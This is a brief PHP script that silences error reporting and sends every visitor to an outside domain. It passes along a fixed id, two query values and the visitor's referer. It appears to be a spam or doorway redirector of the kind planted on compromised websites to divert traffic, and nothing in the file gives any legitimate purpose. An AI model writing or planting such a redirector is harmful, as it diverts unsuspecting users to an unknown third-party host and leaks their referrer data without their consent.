<?php
error_reporting(0);
$domain = 'http://swt.zishajyw.com/find';
$params = array(
    'u' => 266,
    'f' => $_GET['f'],
    'k' => $_GET['k'],
    'r' => $_SERVER['HTTP_REFERER'],
);
$url = $domain . '?' . http_build_query($params);
header('Location: '.$url);